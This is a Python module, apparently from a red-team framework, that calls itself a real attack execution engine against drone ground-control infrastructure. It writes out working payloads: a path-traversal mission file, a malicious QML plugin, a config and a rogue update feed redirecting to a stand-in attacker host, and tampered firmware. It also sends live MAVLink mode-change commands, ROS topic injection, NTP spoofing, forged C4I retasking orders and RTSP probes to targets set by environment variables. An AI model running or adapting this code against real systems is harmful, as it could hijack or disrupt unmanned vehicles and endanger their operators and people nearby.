"""지상 세그먼트 실 공격 실행 엔진 — 실제 파일/소켓/HTTP (S86~S99).

execute/(§U) 패턴: 실 아티팩트를 실제로 디스크에 쓰거나 소켓/HTTP로 전송한다.
표적은 env 로 지정(미설정=미전송). run_ground(dry=False)가 §T 샌드박스로 감싼다.
execute_real() 은 실 공격 코드 — loopback 으로 직접 검증 가능.
"""
from __future__ import annotations

import json
import os
import socket
import struct
import urllib.request

from ..transport.delivery import build_mavlink_command_frame, udp_deliver


# ── 실 페이로드 바이트 빌더 ──────────────────────────────────────────────────
def payload_bytes(sid: str, kind: str) -> bytes:
    if kind == "mission_file":          # QGC .plan — 경로순회 파일참조 + 오버롱 필드
        return json.dumps({
            "fileType": "Plan", "version": 1,
            "mission": {"items": [{"command": 16, "frame": 3,
                        "params": [0, 0, 0, 0, "../" * 12 + "etc/passwd", 0, 0],
                        "note": "A" * 4096}]}}).encode()
    if kind == "qml":                   # 악성 QML 플러그인
        return (b"import QtQuick 2.0\nComponent.onCompleted: { "
                b"Qt.createQmlObject('import QtQuick 2.0; Timer{running:true;"
                b"onTriggered: Qt.exit(0)}', parent); }\n")
    if kind == "config":                # GCS 설정 변조(원격 엔드포인트 재지정)
        return b"[Comm]\nMAVLINK_COMM=udp:203.0.113.66:14550\n[Logging]\nEnabled=false\n"
    if kind == "update":                # 자동업데이트 MITM — 무서명 바이너리 지목 rogue appcast
        return (b'<?xml version="1.0"?><rss xmlns:sparkle="http://sparkle-project.org">'
                b'<channel><item><sparkle:version>99.9</sparkle:version>'
                b'<enclosure url="http://203.0.113.66/QGC_evil" length="0" '
                b'type="application/octet-stream"/></item></channel></rss>')
    if kind == "firmware":              # 무서명 OTA 펌웨어 헤더(변조)
        return b"FWIMG\x00" + b"\xef" * 64 + b"UNSIGNED_OTA"
    return b""


def _endpoint(url: str, default_port: int):
    from urllib.parse import urlparse
    u = urlparse(url if "://" in url else "http://" + url)
    return (u.hostname or "", u.port or default_port)


def build_ntp_spoof() -> bytes:
    """NTP mode-4(server) 응답 48바이트 — 시각 오프셋 주입."""
    return struct.pack("!B B B b 11I", 0x24, 1, 0, -6, *([0] * 11))


def build_rtsp_describe(url: str) -> bytes:
    return (f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\n"
            f"User-Agent: rt\r\nAccept: application/sdp\r\n\r\n").encode()


# ── 실 실행(execute_real) — 표적 도달 시 실제 공격 수행 ──────────────────────
def execute_real(sid: str) -> dict:
    from .attacks import GROUND_SCENARIOS
    m = GROUND_SCENARIOS[sid]
    kind, obj = m["kind"], m["objective"]

    # 1) 파일계열 — 실제 디스크 쓰기
    if kind in ("mission_file", "qml", "config", "firmware", "update"):
        d = os.environ.get("GROUND_TARGET_DIR", "")
        data = payload_bytes(sid, kind)
        if not d:
            return {"sent": False, "reason": "GROUND_TARGET_DIR 미설정", "bytes": len(data)}
        os.makedirs(d, exist_ok=True)
        fn = {"mission_file": "evil.plan", "qml": "evil.qml", "config": "gcs.ini",
              "firmware": "modem_ota.bin", "update": "appcast.xml"}[kind]
        path = os.path.join(d, f"{sid}_{fn}")
        with open(path, "wb") as f:
            f.write(data)
        return {"sent": True, "path": path, "bytes": len(data)}

    # 2) ROS master — 실 XML-RPC
    if kind == "ros_master":
        uri = os.environ.get("ROS_MASTER_URI", "")
        if not uri:
            return {"sent": False, "reason": "ROS_MASTER_URI 미설정"}
        import xmlrpc.client
        code, msg, state = xmlrpc.client.ServerProxy(uri).getSystemState("/rt")
        return {"sent": True, "system_state": state}

    # 3) ROS topic inject — 실 XML-RPC registerPublisher
    if kind == "ros_pub" and obj == "ros_topic_inject":
        uri = os.environ.get("ROS_MASTER_URI", "")
        if not uri:
            return {"sent": False, "reason": "ROS_MASTER_URI 미설정"}
        import xmlrpc.client
        r = xmlrpc.client.ServerProxy(uri).registerPublisher(
            "/rt", "/cmd_vel", "geometry_msgs/Twist", "http://127.0.0.1:0")
        return {"sent": True, "register": r}

    # 4) MAVROS cmd inject — 실 MAVLink COMMAND_LONG UDP
    if kind == "ros_pub" and obj == "mavros_cmd_inject":
        ep = os.environ.get("MAVLINK_ENDPOINT", "")
        if not ep:
            return {"sent": False, "reason": "MAVLINK_ENDPOINT 미설정"}
        h, _, p = ep.partition(":")
        frame = build_mavlink_command_frame(176, [1, 4])   # SET_MODE GUIDED
        n = udp_deliver(h, int(p or 14550), frame)
        return {"sent": True, "bytes": n}

    # 5) 텔레메트리 릴레이 MITM — 실 UDP 프록시(1 프레임 변조 포워드)
    if kind == "mitm":
        fwd = os.environ.get("RELAY_FORWARD", "")   # host:port
        if not fwd:
            return {"sent": False, "reason": "RELAY_FORWARD 미설정"}
        h, _, p = fwd.partition(":")
        n = udp_deliver(h, int(p or 14550), b"MITM_TAMPERED_MAVLINK")
        return {"sent": True, "bytes": n}

    # 6) NTP 스푸핑 — 실 UDP
    if kind == "ntp":
        tgt = os.environ.get("NTP_TARGET", "")
        if not tgt:
            return {"sent": False, "reason": "NTP_TARGET 미설정"}
        h, _, p = tgt.partition(":")
        n = udp_deliver(h, int(p or 123), build_ntp_spoof())
        return {"sent": True, "bytes": n}

    # 7) HTTP 계열(fleet API·telemetry·C4I) — 실 요청
    if kind == "http":
        env_key = {"fleet_api_bypass": "FLEET_API_URL", "telemetry_poison": "TELEMETRY_URL",
                   "c4i_inject": "C4I_URL"}[obj]
        url = os.environ.get(env_key, "")
        if not url:
            return {"sent": False, "reason": f"{env_key} 미설정"}
        if obj == "fleet_api_bypass":
            req = urllib.request.Request(url, method="GET")       # IDOR GET
        else:
            body = json.dumps({"telemetry_poison": {"lat": 0, "lon": 0, "spoofed": True},
                               "c4i_inject": {"order": "RETASK", "forged": True}}[obj]).encode()
            req = urllib.request.Request(url, data=body, method="POST",
                                         headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=3) as resp:
            return {"sent": True, "status": resp.status}

    # 8) RTSP 하이재킹 — 실 TCP DESCRIBE
    if kind == "rtsp":
        tgt = os.environ.get("RTSP_TARGET", "")   # host:port
        if not tgt:
            return {"sent": False, "reason": "RTSP_TARGET 미설정"}
        h, _, p = tgt.partition(":")
        with socket.create_connection((h, int(p or 554)), timeout=3) as s:
            s.sendall(build_rtsp_describe(f"rtsp://{tgt}/stream"))
            resp = s.recv(256)
        return {"sent": True, "resp": resp[:64].decode(errors="replace")}

    return {"sent": False, "reason": "unknown kind"}
